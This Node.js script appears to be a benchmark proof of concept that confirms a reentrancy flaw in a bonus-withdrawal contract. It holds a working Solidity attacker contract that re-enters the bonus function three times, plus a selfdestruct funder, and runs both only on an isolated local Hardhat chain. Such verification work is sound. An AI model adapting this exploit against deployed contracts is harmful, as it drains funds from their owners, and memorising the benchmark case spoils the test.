'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const attackerSource = `pragma solidity ^0.4.24;
interface IBonus { function getFirstWithdrawalBonus(address recipient) public; }
contract BonusReentry {
  IBonus public target;
  uint public callbacks;
  uint public received;
  function BonusReentry(address targetAddress) public { target = IBonus(targetAddress); }
  function attack() public { target.getFirstWithdrawalBonus(address(this)); }
  function() public payable {
    received += msg.value;
    if (callbacks < 3) { callbacks += 1; target.getFirstWithdrawalBonus(address(this)); }
  }
}
contract ForceFunding {
  function ForceFunding(address target) public payable { selfdestruct(target); }
}`;

function digest(value) { return crypto.createHash('sha256').update(value).digest('hex'); }

(async () => {
  const sourcePath = path.resolve(process.argv[2]);
  const source = fs.readFileSync(sourcePath, 'utf8');
  const sourceSha256 = digest(source);
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('training_poc_requires_isolated_local_evm');
  const sources = { 'Reentrancy_bonus.sol': { content: source }, 'BonusAttack.sol': { content: attackerSource } };
  const input = { language: 'Solidity', sources,
    settings: { optimizer: { enabled: false }, outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } } };
  const compiled = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (compiled.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  const targetEntry = compiled.contracts?.['Reentrancy_bonus.sol']?.Reentrancy_bonus;
  const attackerEntry = compiled.contracts?.['BonusAttack.sol']?.BonusReentry;
  const funderEntry = compiled.contracts?.['BonusAttack.sol']?.ForceFunding;
  if (!targetEntry || !attackerEntry || !funderEntry) throw new Error('required_artifact_missing');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) throw new Error('evm_not_isolated');
  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('chain_id_mismatch');
  const signer = await provider.getSigner(0);
  const target = await new ContractFactory(targetEntry.abi, targetEntry.evm.bytecode.object, signer).deploy();
  await target.waitForDeployment();
  const targetAddress = await target.getAddress();
  await (await new ContractFactory(funderEntry.abi, funderEntry.evm.bytecode.object, signer)
    .deploy(targetAddress, { value: 1000000000000000000n })).waitForDeployment();
  const before = BigInt(await hre.network.provider.send('eth_getBalance', [targetAddress, 'latest']));
  const attacker = await new ContractFactory(attackerEntry.abi, attackerEntry.evm.bytecode.object, signer).deploy(targetAddress);
  await attacker.waitForDeployment();
  const attackerAddress = await attacker.getAddress();
  const receipt = await (await attacker.attack({ gasLimit: 5000000 })).wait();
  const after = BigInt(await hre.network.provider.send('eth_getBalance', [targetAddress, 'latest']));
  const attackerBalance = BigInt(await hre.network.provider.send('eth_getBalance', [attackerAddress, 'latest']));
  const received = await attacker.received();
  const callbacks = await attacker.callbacks();
  const confirmed = before === 1000000000000000000n && received === 400n && attackerBalance === 400n &&
    after === before - received && callbacks === 3n && receipt.status === 1;
  const result = {
    schemaVersion: 1, state: confirmed ? 'passed' : 'failed', confirmedVulnerability: confirmed,
    caseId: 'smartbugs-reentrancy-bonus', vulnerability: 'reentrancy',
    sourceSha256, attackerSourceSha256: digest(attackerSource), compilerVersion: solc.version(),
    compilerSha256: process.env.BENCHMARK_SOLC_SHA256 || null,
    mode: 'isolated_in_process', chainId, beforeTargetBalanceWei: before.toString(),
    afterTargetBalanceWei: after.toString(), targetBalanceDeltaWei: (before - after).toString(),
    attackerReceivedWei: attackerBalance.toString(),
    callbacks: callbacks.toString(), transactionHash: receipt.hash, transactionStatus: receipt.status,
    executionBoundary: publicBoundary(fork, { chainId, forkState: 'not_performed' }),
    assertion: 'A single recipient receives the 100 wei bonus four times because claimedBonus is set only after the callback returns.',
    reason: confirmed ? null : 'bonus_reentrancy_balance_assertion_failed',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 1;
});
